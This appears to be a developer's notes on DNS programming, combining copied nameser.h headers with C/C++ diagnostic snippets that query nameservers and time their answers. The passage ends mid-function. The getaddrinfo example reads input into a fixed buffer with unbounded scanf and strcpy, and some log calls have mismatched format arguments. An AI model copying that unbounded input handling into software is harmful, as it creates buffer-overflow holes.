#define T_UNSPEC	103		/* Unspecified format (binary data) */
	/* Query type values which do not appear in resource records */
#define	T_IXFR		251		/* incremental zone transfer */
#define T_AXFR		252		/* transfer zone of authority */
#define T_MAILB		253		/* transfer mailbox records */
#define T_MAILA		254		/* transfer mail agent records */
#define T_ANY		255		/* wildcard match */

/*
 * Values for class field
 */

#define C_IN		1		/* the arpa internet */
#define C_CHAOS		3		/* for chaos net (MIT) */
#define C_HS		4		/* for Hesiod name server (MIT) (XXX) */
	/* Query class values which do not appear in resource records */
#define C_ANY		255		/* wildcard match */

/*
 * Flags field of the KEY RR rdata
 */
#define	KEYFLAG_TYPEMASK	0xC000	/* Mask for "type" bits */
#define	KEYFLAG_TYPE_AUTH_CONF	0x0000	/* Key usable for both */
#define	KEYFLAG_TYPE_CONF_ONLY	0x8000	/* Key usable for confidentiality */
#define	KEYFLAG_TYPE_AUTH_ONLY	0x4000	/* Key usable for authentication */
#define	KEYFLAG_TYPE_NO_KEY	0xC000	/* No key usable for either; no key */
/* The type bits can also be interpreted independently, as single bits: */
#define	KEYFLAG_NO_AUTH		0x8000	/* Key not usable for authentication */
#define	KEYFLAG_NO_CONF		0x4000	/* Key not usable for confidentiality */

#define	KEYFLAG_EXPERIMENTAL	0x2000	/* Security is *mandatory* if bit=0 */
#define	KEYFLAG_RESERVED3	0x1000  /* reserved - must be zero */
#define	KEYFLAG_RESERVED4	0x0800  /* reserved - must be zero */
#define	KEYFLAG_USERACCOUNT	0x0400	/* key is assoc. with a user acct */
#define	KEYFLAG_ENTITY		0x0200	/* key is assoc. with entity eg host */
#define	KEYFLAG_ZONEKEY		0x0100	/* key is zone key for the zone named */
#define	KEYFLAG_IPSEC		0x0080  /* key is for IPSEC use (host or user)*/
#define	KEYFLAG_EMAIL		0x0040  /* key is for email (MIME security) */
#define	KEYFLAG_RESERVED10	0x0020  /* reserved - must be zero */
#define	KEYFLAG_RESERVED11	0x0010  /* reserved - must be zero */
#define	KEYFLAG_SIGNATORYMASK	0x000F	/* key can sign DNS RR's of same name */

#define  KEYFLAG_RESERVED_BITMASK ( KEYFLAG_RESERVED3 | \
				    KEYFLAG_RESERVED4 | \
				    KEYFLAG_RESERVED10| KEYFLAG_RESERVED11) 

/* The Algorithm field of the KEY and SIG RR's is an integer, {1..254} */
#define	ALGORITHM_MD5RSA	1	/* MD5 with RSA */
#define	ALGORITHM_EXPIRE_ONLY	253	/* No alg, no security */
#define	ALGORITHM_PRIVATE_OID	254	/* Key begins with OID indicating alg */

/* Signatures */
					/* Size of a mod or exp in bits */
#define	MIN_MD5RSA_KEY_PART_BITS	 512
#define	MAX_MD5RSA_KEY_PART_BITS	2552
					/* Total of binary mod and exp, bytes */
#define	MAX_MD5RSA_KEY_BYTES		((MAX_MD5RSA_KEY_PART_BITS+7/8)*2+3)
					/* Max length of text sig block */
#define	MAX_KEY_BASE64			(((MAX_MD5RSA_KEY_BYTES+2)/3)*4)

/*
 * Status return codes for T_UNSPEC conversion routines
 */
#define CONV_SUCCESS	0
#define CONV_OVERFLOW	(-1)
#define CONV_BADFMT	(-2)
#define CONV_BADCKSUM	(-3)
#define CONV_BADBUFLEN	(-4)

#ifndef BYTE_ORDER
#if (BSD >= 199103)
# include <machine/endian.h>
#else
#ifdef linux
# include <endian.h>
#else
#define LITTLE_ENDIAN	1234	/* least-significant byte first (vax, pc) */
#define BIG_ENDIAN	4321	/* most-significant byte first (IBM, net) */
#define PDP_ENDIAN	3412	/* LSB first in word, MSW first in long (pdp)*/

#if defined(vax) || defined(ns32000) || defined(sun386) || defined(i386) || \
    defined(MIPSEL) || defined(_MIPSEL) || defined(BIT_ZERO_ON_RIGHT) || \
    defined(__alpha__) || defined(__alpha)
#define BYTE_ORDER	LITTLE_ENDIAN
#endif

#if defined(sel) || defined(pyr) || defined(mc68000) || defined(sparc) || \
    defined(is68k) || defined(tahoe) || defined(ibm032) || defined(ibm370) || \
    defined(MIPSEB) || defined(_MIPSEB) || defined(_IBMR2) || defined(DGUX) ||\
    defined(apollo) || defined(__convex__) || defined(_CRAY) || \
    defined(__hppa) || defined(__hp9000) || \
    defined(__hp9000s300) || defined(__hp9000s700) || \
    defined (BIT_ZERO_ON_LEFT) || defined(m68k)
#define BYTE_ORDER	BIG_ENDIAN
#endif
#endif /* linux */
#endif /* BSD */
#endif /* BYTE_ORDER */

#if !defined(BYTE_ORDER) || \
    (BYTE_ORDER != BIG_ENDIAN && BYTE_ORDER != LITTLE_ENDIAN && \
    BYTE_ORDER != PDP_ENDIAN)
	/* you must determine what the correct bit order is for
	 * your compiler - the next line is an intentional error
	 * which will force your compiles to bomb until you fix
	 * the above macros.
	 */
  error "Undefined or invalid BYTE_ORDER";
#endif

/*
 * Structure for query header.  The order of the fields is machine- and
 * compiler-dependent, depending on the byte/bit order and the layout
 * of bit fields.  We use bit fields only in int variables, as this
 * is all ANSI requires.  This requires a somewhat confusing rearrangement.
 */

typedef struct {
	unsigned	id :16;		/* query identification number */
#if BYTE_ORDER == BIG_ENDIAN
			/* fields in third byte */
	unsigned	qr: 1;		/* response flag */
	unsigned	opcode: 4;	/* purpose of message */
	unsigned	aa: 1;		/* authoritive answer */
	unsigned	tc: 1;		/* truncated message */
	unsigned	rd: 1;		/* recursion desired */
			/* fields in fourth byte */
	unsigned	ra: 1;		/* recursion available */
	unsigned	unused :1;	/* unused bits (MBZ as of 4.9.3a3) */
	unsigned	ad: 1;		/* authentic data from named */
	unsigned	cd: 1;		/* checking disabled by resolver */
	unsigned	rcode :4;	/* response code */
#endif
#if BYTE_ORDER == LITTLE_ENDIAN || BYTE_ORDER == PDP_ENDIAN
			/* fields in third byte */
	unsigned	rd :1;		/* recursion desired */
	unsigned	tc :1;		/* truncated message */
	unsigned	aa :1;		/* authoritive answer */
	unsigned	opcode :4;	/* purpose of message */
	unsigned	qr :1;		/* response flag */
			/* fields in fourth byte */
	unsigned	rcode :4;	/* response code */
	unsigned	cd: 1;		/* checking disabled by resolver */
	unsigned	ad: 1;		/* authentic data from named */
	unsigned	unused :1;	/* unused bits (MBZ as of 4.9.3a3) */
	unsigned	ra :1;		/* recursion available */
#endif
			/* remaining bytes */
	unsigned	qdcount :16;	/* number of question entries */
	unsigned	ancount :16;	/* number of answer entries */
	unsigned	nscount :16;	/* number of authority entries */
	unsigned	arcount :16;	/* number of resource entries */
} HEADER;

/*
 * Defines for handling compressed domain names
 */
#define INDIR_MASK	0xc0

extern	u_int16_t	_getshort __P((const u_char *));
extern	u_int32_t	_getlong __P((const u_char *));

/*
 * Inline versions of get/put short/long.  Pointer is advanced.
 *
 * These macros demonstrate the property of C whereby it can be
 * portable or it can be elegant but rarely both.
 */
#define GETSHORT(s, cp) { \
	register u_char *t_cp = (u_char *)(cp); \
	(s) = ((u_int16_t)t_cp[0] << 8) \
	    | ((u_int16_t)t_cp[1]) \
	    ; \
	(cp) += INT16SZ; \
}

#define GETLONG(l, cp) { \
	register u_char *t_cp = (u_char *)(cp); \
	(l) = ((u_int32_t)t_cp[0] << 24) \
	    | ((u_int32_t)t_cp[1] << 16) \
	    | ((u_int32_t)t_cp[2] << 8) \
	    | ((u_int32_t)t_cp[3]) \
	    ; \
	(cp) += INT32SZ; \
}

#define PUTSHORT(s, cp) { \
	register u_int16_t t_s = (u_int16_t)(s); \
	register u_char *t_cp = (u_char *)(cp); \
	*t_cp++ = t_s >> 8; \
	*t_cp   = t_s; \
	(cp) += INT16SZ; \
}

#define PUTLONG(l, cp) { \
	register u_int32_t t_l = (u_int32_t)(l); \
	register u_char *t_cp = (u_char *)(cp); \
	*t_cp++ = t_l >> 24; \
	*t_cp++ = t_l >> 16; \
	*t_cp++ = t_l >> 8; \
	*t_cp   = t_l; \
	(cp) += INT32SZ; \
}

#endif /* !_NAMESER_H_ */


			10.5.7.2 new version

#ifndef ARES_NAMESER_H
#define ARES_NAMESER_H

/* header file provided by liren@vivisimo.com */

#ifndef HAVE_ARPA_NAMESER_H

#define NS_PACKETSZ     512   /* maximum packet size */
#define NS_MAXDNAME     256   /* maximum domain name */
#define NS_MAXCDNAME    255   /* maximum compressed domain name */
#define NS_MAXLABEL     63
#define NS_HFIXEDSZ     12    /* #/bytes of fixed data in header */
#define NS_QFIXEDSZ     4     /* #/bytes of fixed data in query */
#define NS_RRFIXEDSZ    10    /* #/bytes of fixed data in r record */
#define NS_INT16SZ      2
#define NS_INADDRSZ     4
#define NS_IN6ADDRSZ    16
#define NS_CMPRSFLGS    0xc0  /* Flag bits indicating name compression. */
#define NS_DEFAULTPORT  53    /* For both TCP and UDP. */

typedef enum __ns_class {
    ns_c_invalid = 0,       /* Cookie. */
    ns_c_in = 1,            /* Internet. */
    ns_c_2 = 2,             /* unallocated/unsupported. */
    ns_c_chaos = 3,         /* MIT Chaos-net. */
    ns_c_hs = 4,            /* MIT Hesiod. */
    /* Query class values which do not appear in resource records */
    ns_c_none = 254,        /* for prereq. sections in update requests */
    ns_c_any = 255,         /* Wildcard match. */
    ns_c_max = 65536
} ns_class;

typedef enum __ns_type {
    ns_t_invalid = 0,       /* Cookie. */
    ns_t_a = 1,             /* Host address. */
    ns_t_ns = 2,            /* Authoritative server. */
    ns_t_md = 3,            /* Mail destination. */
    ns_t_mf = 4,            /* Mail forwarder. */
    ns_t_cname = 5,         /* Canonical name. */
    ns_t_soa = 6,           /* Start of authority zone. */
    ns_t_mb = 7,            /* Mailbox domain name. */
    ns_t_mg = 8,            /* Mail group member. */
    ns_t_mr = 9,            /* Mail rename name. */
    ns_t_null = 10,         /* Null resource record. */
    ns_t_wks = 11,          /* Well known service. */
    ns_t_ptr = 12,          /* Domain name pointer. */
    ns_t_hinfo = 13,        /* Host information. */
    ns_t_minfo = 14,        /* Mailbox information. */
    ns_t_mx = 15,           /* Mail routing information. */
    ns_t_txt = 16,          /* Text strings. */
    ns_t_rp = 17,           /* Responsible person. */
    ns_t_afsdb = 18,        /* AFS cell database. */
    ns_t_x25 = 19,          /* X_25 calling address. */
    ns_t_isdn = 20,         /* ISDN calling address. */
    ns_t_rt = 21,           /* Router. */
    ns_t_nsap = 22,         /* NSAP address. */
    ns_t_nsap_ptr = 23,     /* Reverse NSAP lookup (deprecated). */
    ns_t_sig = 24,          /* Security signature. */
    ns_t_key = 25,          /* Security key. */
    ns_t_px = 26,           /* X.400 mail mapping. */
    ns_t_gpos = 27,         /* Geographical position (withdrawn). */
    ns_t_aaaa = 28,         /* Ip6 Address. */
    ns_t_loc = 29,          /* Location Information. */
    ns_t_nxt = 30,          /* Next domain (security). */
    ns_t_eid = 31,          /* Endpoint identifier. */
    ns_t_nimloc = 32,       /* Nimrod Locator. */
    ns_t_srv = 33,          /* Server Selection. */
    ns_t_atma = 34,         /* ATM Address */
    ns_t_naptr = 35,        /* Naming Authority PoinTeR */
    ns_t_kx = 36,           /* Key Exchange */
    ns_t_cert = 37,         /* Certification record */
    ns_t_a6 = 38,           /* IPv6 address (deprecates AAAA) */
    ns_t_dname = 39,        /* Non-terminal DNAME (for IPv6) */
    ns_t_sink = 40,         /* Kitchen sink (experimentatl) */
    ns_t_opt = 41,          /* EDNS0 option (meta-RR) */
    ns_t_apl = 42,          /* Address prefix list (RFC3123) */
    ns_t_ds = 43,           /* Delegation Signer (RFC4034) */
    ns_t_sshfp = 44,        /* SSH Key Fingerprint (RFC4255) */
    ns_t_rrsig = 46,        /* Resource Record Signature (RFC4034) */
    ns_t_nsec = 47,         /* Next Secure (RFC4034) */
    ns_t_dnskey = 48,       /* DNS Public Key (RFC4034) */
    ns_t_tkey = 249,        /* Transaction key */
    ns_t_tsig = 250,        /* Transaction signature. */
    ns_t_ixfr = 251,        /* Incremental zone transfer. */
    ns_t_axfr = 252,        /* Transfer zone of authority. */
    ns_t_mailb = 253,       /* Transfer mailbox records. */
    ns_t_maila = 254,       /* Transfer mail agent records. */
    ns_t_any = 255,         /* Wildcard match. */
    ns_t_zxfr = 256,        /* BIND-specific, nonstandard. */
    ns_t_max = 65536
} ns_type;

typedef enum __ns_opcode {
    ns_o_query = 0,         /* Standard query. */
    ns_o_iquery = 1,        /* Inverse query (deprecated/unsupported). */
    ns_o_status = 2,        /* Name server status query (unsupported). */
                                /* Opcode 3 is undefined/reserved. */
    ns_o_notify = 4,        /* Zone change notification. */
    ns_o_update = 5,        /* Zone update message. */
    ns_o_max = 6
} ns_opcode;

typedef enum __ns_rcode {
    ns_r_noerror = 0,       /* No error occurred. */
    ns_r_formerr = 1,       /* Format error. */
    ns_r_servfail = 2,      /* Server failure. */
    ns_r_nxdomain = 3,      /* Name error. */
    ns_r_notimpl = 4,       /* Unimplemented. */
    ns_r_refused = 5,       /* Operation refused. */
    /* these are for BIND_UPDATE */
    ns_r_yxdomain = 6,      /* Name exists */
    ns_r_yxrrset = 7,       /* RRset exists */
    ns_r_nxrrset = 8,       /* RRset does not exist */
    ns_r_notauth = 9,       /* Not authoritative for zone */
    ns_r_notzone = 10,      /* Zone of record different from zone section */
    ns_r_max = 11,
    /* The following are TSIG extended errors */
    ns_r_badsig = 16,
    ns_r_badkey = 17,
    ns_r_badtime = 18
} ns_rcode;

#endif /* HAVE_ARPA_NAMESER_H */

#ifndef HAVE_ARPA_NAMESER_COMPAT_H

#define PACKETSZ         NS_PACKETSZ
#define MAXDNAME         NS_MAXDNAME
#define MAXCDNAME        NS_MAXCDNAME
#define MAXLABEL         NS_MAXLABEL
#define HFIXEDSZ         NS_HFIXEDSZ
#define QFIXEDSZ         NS_QFIXEDSZ
#define RRFIXEDSZ        NS_RRFIXEDSZ
#define INDIR_MASK       NS_CMPRSFLGS
#define NAMESERVER_PORT  NS_DEFAULTPORT

#define QUERY           ns_o_query

#define SERVFAIL        ns_r_servfail
#define NOTIMP          ns_r_notimpl
#define REFUSED         ns_r_refused
#undef NOERROR /* it seems this is already defined in winerror.h */
#define NOERROR         ns_r_noerror
#define FORMERR         ns_r_formerr
#define NXDOMAIN        ns_r_nxdomain

#define C_IN            ns_c_in
#define C_CHAOS         ns_c_chaos
#define C_HS            ns_c_hs
#define C_NONE          ns_c_none
#define C_ANY           ns_c_any

#define T_A             ns_t_a
#define T_NS            ns_t_ns
#define T_MD            ns_t_md
#define T_MF            ns_t_mf
#define T_CNAME         ns_t_cname
#define T_SOA           ns_t_soa
#define T_MB            ns_t_mb
#define T_MG            ns_t_mg
#define T_MR            ns_t_mr
#define T_NULL          ns_t_null
#define T_WKS           ns_t_wks
#define T_PTR           ns_t_ptr
#define T_HINFO         ns_t_hinfo
#define T_MINFO         ns_t_minfo
#define T_MX            ns_t_mx
#define T_TXT           ns_t_txt
#define T_RP            ns_t_rp
#define T_AFSDB         ns_t_afsdb
#define T_X25           ns_t_x25
#define T_ISDN          ns_t_isdn
#define T_RT            ns_t_rt
#define T_NSAP          ns_t_nsap
#define T_NSAP_PTR      ns_t_nsap_ptr
#define T_SIG           ns_t_sig
#define T_KEY           ns_t_key
#define T_PX            ns_t_px
#define T_GPOS          ns_t_gpos
#define T_AAAA          ns_t_aaaa
#define T_LOC           ns_t_loc
#define T_NXT           ns_t_nxt
#define T_EID           ns_t_eid
#define T_NIMLOC        ns_t_nimloc
#define T_SRV           ns_t_srv
#define T_ATMA          ns_t_atma
#define T_NAPTR         ns_t_naptr
#define T_KX            ns_t_kx
#define T_CERT          ns_t_cert
#define T_A6            ns_t_a6
#define T_DNAME         ns_t_dname
#define T_SINK          ns_t_sink
#define T_OPT           ns_t_opt
#define T_APL           ns_t_apl
#define T_DS            ns_t_ds
#define T_SSHFP         ns_t_sshfp
#define T_RRSIG         ns_t_rrsig
#define T_NSEC          ns_t_nsec
#define T_DNSKEY        ns_t_dnskey
#define T_TKEY          ns_t_tkey
#define T_TSIG          ns_t_tsig
#define T_IXFR          ns_t_ixfr
#define T_AXFR          ns_t_axfr
#define T_MAILB         ns_t_mailb
#define T_MAILA         ns_t_maila
#define T_ANY           ns_t_any

#endif /* HAVE_ARPA_NAMESER_COMPAT_H */

#endif /* ARES_NAMESER_H */

			10.5.7.3
		10.5.8 My code snippets

			10.5.8.1  get list of nameservers from _res (loaded from resolv.conf) 
int getConfiguredNameserversNames(vector<string> &sarr_ret_ns )
{
        printf("Loading list of configured nameserver names...\n");

        sockaddr_in addr ;
        char str[INET_ADDRSTRLEN];
        for ( int i=0; i < _res.nscount; ++i ) {
            addr = _res.nsaddr_list[i];
            inet_ntop(AF_INET,&(addr.sin_addr), str, INET_ADDRSTRLEN);
            sarr_ret_ns.push_back(str);
        }
}

			10.5.8.2 gethostbyname
int    DNS_DIAG::queryDomainArecordInAllNS(const TestParams & test_params, TestResults & test_res) 
{


        test_res.s_remediation = "Adress record found";
        test_res.s_result = DiagConsts::s_test_pass_status;
        test_res.t_elapsed_time = 0;
        string domain = test_params.s_joinpoint ;

        m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::queryDomainArecordInAllNS() - gethostbyname query A record of domain %s in all configured nameservers...\n", domain.c_str());


        struct hostent *p_host; 

        struct timeval t_start, t_end;
        gettimeofday(&t_start, NULL);
        test_res.tval_start_time = t_start; 
 
        p_host = gethostbyname(domain.c_str());
        gettimeofday(&t_end, NULL);
        long long ms_interval = ((t_end.tv_sec * 1000000LL + t_end.tv_usec) - (t_start.tv_sec * 1000000LL + t_start.tv_usec)) ;
        m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::queryDomainArecordInAllNS() - Took %ld microseconds\n", ms_interval);
        test_res.t_elapsed_time = ms_interval;

        if (p_host == NULL) {
             m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "There is no address for domain %s\n", domain.c_str() );
             
             test_res.s_remediation = rtype_ErrorParser( h_errno, ns_t_a, domain )  ;
             test_res.s_result = DiagConsts::s_test_fail_status;
            return 1;
            }
        else
        {
                m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::queryDomainArecordInAllNS() - Found domain A record %s \n " , p_host->h_name);
                if (ms_interval > DNS_Consts::i_higher_threshold)
                {

                    m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::queryDomainArecordInAllNS() - Higher threshold exceeded  for %s\n " , p_host->h_name);
                    test_res.s_remediation = "Query response is very slow. Please check DNS configuration";
                    test_res.s_result = DiagConsts::s_test_fail_status;
                }

                else if (ms_interval > DNS_Consts::i_lower_threshold)
                {
                    m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::queryDomainArecordInAllNS() - Lower threshold exceeded  for %s%s\n " , p_host->h_name);
                    test_res.s_remediation = "Query response is slow. Please check DNS configuration";
                    test_res.s_result = DiagConsts::s_test_warn_status;
                }
                else
                {
                    m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::queryDomainArecordInAllNS() - Query response is ok for %s.\n " , p_host->h_name);

                }
        }

        return 0;
}


			10.5.8.3 res_query A record
int    DNS_DIAG::res_queryDomainArecordInAllNS(const TestParams & test_params, TestResults & test_res) 
{
        test_res.s_remediation = "Adress record found";
        test_res.s_result = DiagConsts::s_test_pass_status;
        test_res.t_elapsed_time = 0;
        string domain = test_params.s_joinpoint ;

        m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() - res_query A record of domain %s in all configured nameservers...\n", domain.c_str());

        union {
            HEADER hdr;               /* defined in resolv.h */
            u_char buf[NS_PACKETSZ];  /* defined in arpa/nameser.h */
        } query, response;            /* query and response buffers */
        int responseLen, queryLen;    /* buffer lengths */
        
        u_char     *cp;       /* character pointer to parse DNS message */
        
        ns_msg handle;  /* handle for response message */
        ns_rr rr;       /* expanded resource record */


       /*
        * Turn off the search algorithm and turn off appending
        * the local domain name before we call gethostbyname(  );
        * the name server's domain names will be fully qualified.
        */
        _res.options &= ~(RES_DNSRCH | RES_DEFNAMES);

 
        /*
         * Turn off recursion.  We don't want the name server
         * querying another server for the SOA record; this name
         * server ought to be authoritative for this data.
         */
        _res.options &= ~RES_RECURSE;

        /*
         * Reduce the number of retries.  We may be checking
         * several name servers, so we don't want to wait too
         * long for any one server.  With two retries and only
         * one address to query, we'll wait at most 15 seconds.
         */
        _res.retry = 2;

        m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() - Preparing query\n" );
        queryLen = res_mkquery(
                     ns_o_query,      /* regular query         */
                     domain.c_str(),          /* the domain to look up */
                     ns_c_in,         /* Internet type         */
                     ns_t_a,        /* look up an A record */
                     (u_char *)NULL,  /* always NULL       */
                     0,               /* length of NULL        */
                     (u_char *)NULL,  /* always NULL       */
                     (u_char *)&query,/* buffer for the query  */
                     sizeof(query));  /* size of the buffer    */

        struct timeval t_start, t_end;
        gettimeofday(&t_start, NULL);
        test_res.tval_start_time = t_start; 
 
        /*
         * Send the query message.  If there is no name server
         * running on the target host, res_send(  ) returns -1
         * and errno is ECONNREFUSED.  First, clear out errno.
         */
        m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() - Sending query\n" );
        errno = 0;
        if((responseLen = res_send((u_char *)&query,/* the query  */
                                   queryLen,        /* true length*/
                                   (u_char *)&response,/*buffer  */
                                   sizeof(response)))  /*buf size*/
                                        < 0){          /* error  */
            if(errno == ECONNREFUSED) { /* no server on the host */
                 m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() -  Connection to name server refused \n");
                 test_res.s_remediation = string("Connection to name server refused. Please check network connectivity and name server is online");
            } else {                   /* anything else: no response */
                 m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() -  No response from nameserver\n");
                 test_res.s_remediation = string("No response from nameserver. Please check server is configuration");
            }
            test_res.s_result = DiagConsts::s_test_fail_status;
            return 1;
        } //if((responseLen = res_send((u_char *)&query,/* the query  */

        gettimeofday(&t_end, NULL);
        long long ms_interval = ((t_end.tv_sec * 1000000LL + t_end.tv_usec) - (t_start.tv_sec * 1000000LL + t_start.tv_usec)) ;
        //LogPrintf (LOG_DEBUG, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() - Took %ld microseconds\n", ms_interval);
        m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() - Took %ld microseconds\n", ms_interval);

        test_res.t_elapsed_time = ms_interval;
        /*
         * Initialize a handle to this response.  The handle will
         * be used later to extract information from the response.
         */

        if (ns_initparse(response.buf, responseLen, &handle) < 0) {
            m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() -  ns_initparse: %s\n", strerror(errno));
            test_res.s_remediation = string("Failed to initialize response parser. Please contact TAC for assistance.");
            test_res.s_result = DiagConsts::s_test_fail_status;
            return 1;
        }

        m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() - Parsing response of size %d, containing %d answer sections\n" , ns_msg_size(handle), ns_msg_count(handle, ns_s_an) );

        /*
         * If the response reports an error, issue a message
         */
        if(ns_msg_getflag(handle, ns_f_rcode) != ns_r_noerror){
            m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() - Response contains an error\n" , ns_msg_size(handle), ns_msg_count(handle, ns_s_an) );
            
            test_res.s_remediation = returnCodeError((ns_rcode) ns_msg_getflag(handle, ns_f_rcode));
            test_res.s_result = DiagConsts::s_test_fail_status;
            return 1;
        }

        /*
         * If the response contains no answer, issue a message
         */
        if(ns_msg_count(handle, ns_s_an) == 0 ){
            m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() - Response contains no answer\n");
            test_res.s_remediation = string( "Response contains no answer. Please check DNS configuration.");
            test_res.s_result = DiagConsts::s_test_fail_status;
            return 1;
        }
            
// Uncomment to handle unauthoratibe respons
//        /*
//         * Did we receive an authoritative response?  Check the
//         * authoritative answer bit.  If this name server isn't
//         * authoritative, report it, and go on to the next server.
//         */
//        if(!ns_msg_getflag(handle, ns_f_aa)){
//            (void) fprintf(stderr,
//                "%s is not authoritative for %s\n",
//                nsList[nsNum], domain);
//            continue; /* nsNum for-loop */
//        }

// Uncomment to handle multiple answers in respons
//        /*
//         * The response should only contain one answer; if more,
//         * report the error, and proceed to the next server.
//         */
//        if(ns_msg_count(handle, ns_s_an) != 1){
//            (void) fprintf(stderr,
//                "%s: expected 1 answer, got %d\n",
//                nsList[nsNum], ns_msg_count(handle, ns_s_an));
//            continue; /* nsNum for-loop */
//        }

        m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() - Extracting an rr \n" , ns_msg_size(handle), ns_msg_count(handle, ns_s_an) );
        /*
         * Expand the answer section record number 0 into rr.
         */
        if (ns_parserr(&handle, ns_s_an, 0, &rr)) {
                if (errno != ENODEV){
                        m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() -  ns_parserr: %s\n", strerror(errno));
                        test_res.s_remediation = string("rr rec # 0 is empty. Error: "+string(strerror(errno)));
                        test_res.s_result = DiagConsts::s_test_fail_status;
                        return 1;
                }
        }

        m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() -  rr type %d, name %s, len %d\n" , ns_rr_type(rr),ns_rr_name(rr), ns_rr_rdlen(rr) );
        /*
         * We asked for an A record; if we got something else,
         * report the error
         */
        if (ns_rr_type(rr) != ns_t_a) {
            m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() -   expected answer type %d, got %d\n", ns_t_a, ns_rr_type(rr));
            test_res.s_remediation = string("rr rec is not of type A");
            test_res.s_result = DiagConsts::s_test_fail_status;
            return 1;
        }

     //   //LogPrintf (LOG_DEBUG, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() - Found domain A record %s \n " , p_host->h_name);
     //   printf ("DNS_DIAG::res_queryDomainArecordInAllNS() - Found domain A record %s \n " , p_host->h_name);
          if (ms_interval > DNS_Consts::i_higher_threshold)
          {

              printf ("DNS_DIAG::res_queryDomainArecordInAllNS() - Higher threshold exceeded for %s query\n " ,ns_rr_name(rr));
              test_res.s_remediation = "Query response is very slow. Please check DNS configuration";
              test_res.s_result = DiagConsts::s_test_fail_status;
          }

          else if (ms_interval > DNS_Consts::i_lower_threshold)
          {
              m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() - Lower threshold exceeded for %s query\n " ,ns_rr_name(rr));
              test_res.s_remediation = "Query response is slow. Please check DNS configuration";
              test_res.s_result = DiagConsts::s_test_warn_status;
          }
          else
          {
              m_dLog->diagLog (DIAG_DEBUG,__FILE__, __LINE__, "DNS_DIAG::res_queryDomainArecordInAllNS() - Query response is ok for %s query.\n", ns_rr_name(rr) );

          }

        return 0;

} //int    DNS_DIAG::res_queryDomainArecordInAllNS(const TestParams & test_params, TestResults & test_res) 

			10.5.8.4 Getaddrinfo for resolv hostname to IP

				10.5.8.4.1 Simple
/Users/yizaq/Desktop/Work/code/CPP/dns
YIZAQ-M-D1BW:dns yizaq$ ls
GetAddr.cpp	a.out

Please provide name to resolv
kkk
name to resolv - kkk
getaddrinfo() failed with error code 8 - error nodename nor servname provided, or not known.
YIZAQ-M-D1BW:dns yizaq$ ./a.out 
Please provide name to resolv
google.com
name to resolv - google.com
Found domain IPv4 A record 74.125.195.139 
Found domain IPv4 A record 74.125.195.101 
Found domain IPv4 A record 74.125.195.100 
Found domain IPv4 A record 74.125.195.102 
Found domain IPv4 A record 74.125.195.138 
Found domain IPv4 A record 74.125.195.113 

/*
 * =====================================================================================
 *
 *       Filename:  GetAddr.cpp
 *
 *    Description:  GetAddrinfo 
 *
 *        Version:  1.0
 *        Created:  07/03/2014 10:49:08
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Yosi Izaq
 *   Organization:  
 *
 * =====================================================================================
 */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


// For getaddrinfo 
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h> /* for sockaddr_in and sockaddr_in6 */
#include <arpa/inet.h> /* for sockaddr_in and sockaddr_in6 */

#define _PREF_DCS_RESOLVER_RETRIES 2
#define _PREF_DCS_RESOLVER_TIMEOUT 3
// For getaddrinfo 

int main(int argc, const char *argv[])
{
	char s_name[160];

	if (argc == 1) {
		printf("Please provide name to resolv\n");
		scanf("%s", s_name);
	}
	else if (argc == 2){

		strcpy(s_name, argv[1]);
	}
	printf("name to resolv - %s\n", s_name);

	struct addrinfo aiHints;
	struct addrinfo *pres, *aiList = NULL;
	int retVal;

	// Setup the hints address info structure
	// which is passed to the getaddrinfo() function
	memset(&aiHints, 0, sizeof(aiHints));
	aiHints.ai_family = AF_INET; // Only IPv4, for IPv6 also set PF_UNSPEC
	aiHints.ai_socktype = SOCK_STREAM; // TCP query
	aiHints.ai_protocol = IPPROTO_TCP;
	 
	// Call getaddrinfo(). If the call succeeds, the aiList variable
	// will hold a linked list f addrinfo structures containing
	// response information about the host
	if ((retVal = getaddrinfo(s_name, NULL, &aiHints, &aiList)) != 0)
	{
	  printf("getaddrinfo() failed with error code %d - error %s.\n", retVal, gai_strerror(retVal));
	}


         struct sockaddr_in  *p_sa4;        /* to manipulate IPv4 addresses */
